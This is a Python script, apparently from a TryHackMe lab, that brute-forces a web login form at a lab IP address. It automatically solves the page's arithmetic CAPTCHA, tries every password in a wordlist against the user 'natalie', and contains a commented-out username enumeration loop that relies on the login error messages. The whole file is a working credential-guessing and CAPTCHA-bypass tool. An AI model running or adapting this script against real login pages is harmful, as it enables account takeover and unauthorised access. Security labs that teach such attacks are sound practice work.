import requests
import re
from bs4 import BeautifulSoup

# URL of the webpage
url = "http://10.10.104.92/login"
username_file = "/home/kali/uebungen/thm/Prioritisev2/usernames.txt"
password_file = "/home/kali/uebungen/thm/Prioritisev2/passwords.txt"
username = ""
password = "password"


def getCaptchaSolution(response):
	soup = BeautifulSoup(response.content, 'html.parser')

	# Find all text that matches the pattern of an equation
	equation_pattern = re.compile(r'\s*\d+\s*[-+*/]\s*\d+\s*=\s*\?')
	equation_matches = soup.find_all(string=equation_pattern)

	# Extract and process each equation match
	for equation_text in equation_matches:
		# Extract the numbers and operator from the equation text using regex
		equation_match = re.search(r'(\d+)\s*([-+*/])\s*(\d+)\s*=', equation_text)
		if equation_match:
			num1 = int(equation_match.group(1))
			operator = equation_match.group(2)
			num2 = int(equation_match.group(3))

			# Calculate the result
			if operator == '+':
			    result = num1 + num2
			elif operator == '-':
			    result = num1 - num2
			elif operator == '*':
			    result = num1 * num2
			elif operator == '/':
			    result = num1 / num2

			print(f"Equation: {equation_text.strip()} = {result}")
			#Set new Captcha value
			return str(result)

def sendRequest():
	global captcha
	post_data={"username":username,"password":password,"captcha":captcha}
	response = requests.post(url, data=post_data)

	if not ("does not exist" in response.text or "Invalid password" in response.text):
		print(f"Found: {line.strip()}")
		return True
	captcha = getCaptchaSolution(response)
	return False


post_data={"username":username,"password":password}
response = requests.post(url, data=post_data)
captcha = getCaptchaSolution(response)
print(f"First captcha: {captcha}")


#Username Brute
#with open(username_file, 'r') as file:
#	for line in file:
#		username = line.strip()
#		if sendRequest():
#			break
username="natalie"

#Password brute
with open(password_file, 'r') as file:
	for line in file:
		password = line.strip()
		if sendRequest():
			break
